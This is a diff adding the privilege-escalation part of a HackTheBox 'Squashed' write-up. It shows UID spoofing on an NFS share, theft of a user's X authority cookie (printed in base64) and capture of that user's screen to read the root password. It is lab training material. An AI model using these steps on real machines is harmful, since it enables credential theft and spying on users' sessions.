@@ -1,4 +1,4 @@
-# Box: Squashed
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7cb19272-18ff-4ef0-8477-9f5a23d1f7bf)# Box: Squashed
 # Level: Easy
 # OS: Linux
 <hr>
@@ -279,6 +279,195 @@ We spawned a user shell, lets go ahead and escalate our privileges
 
 
 # Privilege Escalation
+
+Lets go back to the share ```/home/ross``` we mounted earlier
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
+└─$ cd /mnt/backup/
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[/mnt/backup]
+└─$ ls -la
+total 68
+drwxr-xr-x 14 1001 senjumaru 4096 Oct 24 12:50 .
+drwxr-xr-x  4 root root      4096 Oct 24 12:57 ..
+-rw-------  1 1001 senjumaru   57 Oct 24 12:50 .Xauthority
+lrwxrwxrwx  1 root root         9 Oct 20  2022 .bash_history -> /dev/null
+drwx------ 11 1001 senjumaru 4096 Oct 21  2022 .cache
+drwx------ 12 1001 senjumaru 4096 Oct 21  2022 .config
+drwx------  3 1001 senjumaru 4096 Oct 21  2022 .gnupg
+drwx------  3 1001 senjumaru 4096 Oct 21  2022 .local
+lrwxrwxrwx  1 root root         9 Oct 21  2022 .viminfo -> /dev/null
+-rw-------  1 1001 senjumaru 2475 Oct 24 12:50 .xsession-errors
+-rw-------  1 1001 senjumaru 2475 Dec 27  2022 .xsession-errors.old
+drwxr-xr-x  2 1001 senjumaru 4096 Oct 21  2022 Desktop
+drwxr-xr-x  2 1001 senjumaru 4096 Oct 21  2022 Documents
+drwxr-xr-x  2 1001 senjumaru 4096 Oct 21  2022 Downloads
+drwxr-xr-x  2 1001 senjumaru 4096 Oct 21  2022 Music
+drwxr-xr-x  2 1001 senjumaru 4096 Oct 21  2022 Pictures
+drwxr-xr-x  2 1001 senjumaru 4096 Oct 21  2022 Public
+drwxr-xr-x  2 1001 senjumaru 4096 Oct 21  2022 Templates
+drwxr-xr-x  2 1001 senjumaru 4096 Oct 21  2022 Videos
+```
+We can see the ```.Xauthority``` file
+
+To read this file, we'll create a new user and give it the uid of ```1001```
+
+commands
+```
+sudo useradd ichibe
+sudo passwd ichibe
+sudo usermod -u 1001 ichibe
+su ichibe
+```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[/mnt/backup]
+└─$ sudo useradd ichibe
+[sudo] password for bl4ck4non: 
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[/mnt/backup]
+└─$ sudo passwd ichibe
+New password: 
+Retype new password: 
+passwd: password updated successfully
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[/mnt/backup]
+└─$ sudo usermod -u 1001 ichibe
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[/mnt/backup]
+└─$ su ichibe        
+Password: 
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+ichibe@bl4ck4non-sec:/mnt/backup$ ls -la
+total 68
+drwxr-xr-x 14 ichibe senjumaru 4096 Oct 24 12:50 .
+drwxr-xr-x  4 root   root      4096 Oct 24 12:57 ..
+-rw-------  1 ichibe senjumaru   57 Oct 24 12:50 .Xauthority
+lrwxrwxrwx  1 root   root         9 Oct 20  2022 .bash_history -> /dev/null
+drwx------ 11 ichibe senjumaru 4096 Oct 21  2022 .cache
+drwx------ 12 ichibe senjumaru 4096 Oct 21  2022 .config
+drwx------  3 ichibe senjumaru 4096 Oct 21  2022 .gnupg
+drwx------  3 ichibe senjumaru 4096 Oct 21  2022 .local
+lrwxrwxrwx  1 root   root         9 Oct 21  2022 .viminfo -> /dev/null
+-rw-------  1 ichibe senjumaru 2475 Oct 24 12:50 .xsession-errors
+-rw-------  1 ichibe senjumaru 2475 Dec 27  2022 .xsession-errors.old
+drwxr-xr-x  2 ichibe senjumaru 4096 Oct 21  2022 Desktop
+drwxr-xr-x  2 ichibe senjumaru 4096 Oct 21  2022 Documents
+drwxr-xr-x  2 ichibe senjumaru 4096 Oct 21  2022 Downloads
+drwxr-xr-x  2 ichibe senjumaru 4096 Oct 21  2022 Music
+drwxr-xr-x  2 ichibe senjumaru 4096 Oct 21  2022 Pictures
+drwxr-xr-x  2 ichibe senjumaru 4096 Oct 21  2022 Public
+drwxr-xr-x  2 ichibe senjumaru 4096 Oct 21  2022 Templates
+drwxr-xr-x  2 ichibe senjumaru 4096 Oct 21  2022 Videos
+```
+Now lets view the contents of the file
+
+command:```xxd .Xauthority```
+
+```
+ichibe@bl4ck4non-sec:/mnt/backup$ xxd .Xauthority 
+00000000: 0100 000c 7371 7561 7368 6564 2e68 7462  ....squashed.htb
+00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43  ..0..MIT-MAGIC-C
+00000020: 4f4f 4b49 452d 3100 108f 26d8 a002 c28b  OOKIE-1...&.....
+00000030: 397d ebb9 92df bea3 e4                   9}.......
+ichibe@bl4ck4non-sec:/mnt/backup$ 
+```
+We can see the contents of the file looks gibberish, what we'll do is cat the contents of the file and base64 encode it so it isn’t jibberish. Then save the output into the /tmp directory of Squashed via your reverse shell as alex.
+
+```
+ichibe@bl4ck4non-sec:/mnt/backup$ cat .Xauthority | base64
+AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABCPJtigAsKLOX3ruZLfvqPk
+```
+On the reverse shell we have as user alex, run the command
+
+```
+echo AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABCPJtigAsKLOX3ruZLfvqPk | base64 -d > /tmp/.Xauthority
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9314b72d-1a77-4e89-b3a9-21ac600f088b)
+
+We'll use the command ``` export XAUTHORITY=/tmp/.Xauthority``` to set our session. Also, as alex we can do some more enumeration and find out what the configuration of ross’s session is. You can just use the command ```w```, using that will show you
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/88023239-8b48-4c7d-8e83-12ed0f3612a8)
+
+Now, we can use xwd to take a screenshot of the display of the user Ross
+
+command:```xwd -root -screen -silent -display :0 > bankai.xwd```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f64f142e-45e0-435e-b0d6-c3a0b1a21c96)
+
+It worked, now lets cp this file to the ```/var/www/html``` directory since user alex has write access to it. This way we'll be able to download the file to our machine
+
+```
+alex@squashed:/tmp$ cp bankai.xwd /var/www/html
+alex@squashed:/tmp$ ls -la  /var/www/html/
+-rw-r--r-- 1 alex alex     1923179 Oct 24 12:38 bankai.xwd
+
+/var/www/html/:
+total 1936
+drwxr-xr-- 5 alex www-data    4096 Oct 24 12:39 .
+drwxr-xr-x 3 root root        4096 Oct 21  2022 ..
+-rw-r--r-- 1 alex www-data      44 Oct 21  2022 .htaccess
+-rw-r--r-- 1 alex alex     1923179 Oct 24 12:39 bankai.xwd
+drwxr-xr-x 2 alex www-data    4096 Oct 24 12:35 css
+drwxr-xr-x 2 alex www-data    4096 Oct 24 12:35 images
+-rw-r----- 1 alex www-data   32532 Oct 24 12:35 index.html
+drwxr-xr-x 2 alex www-data    4096 Oct 24 12:35 js
+```
+Navigate to the webpage and download the file to your machine
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
+└─$ ls -la bankai.xwd 
+-rw-r--r-- 1 bl4ck4non bl4ck4non 1923179 Oct 24 13:41 bankai.xwd
+```
+To convert this to an image, we can use the command
+
+```
+convert bankai.xwd bankai.png
+```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
+└─$ convert bankai.xwd bankai.png
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
+└─$ ls -la bankai.png 
+-rw-r--r-- 1 bl4ck4non bl4ck4non 48065 Oct 24 13:42 bankai.png
+```
+nice nice, lets view the image with an image viewing software
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5d14dbc7-0ecf-4614-b156-eb142b43217a)
+
+This looks like a password manager showing the root password.
+
+Lets switch user to root
+
+command:```su root```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/255bdeb0-372d-4f19-8da6-83984bef6ac4)
+
+We have successfully pwned this box
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
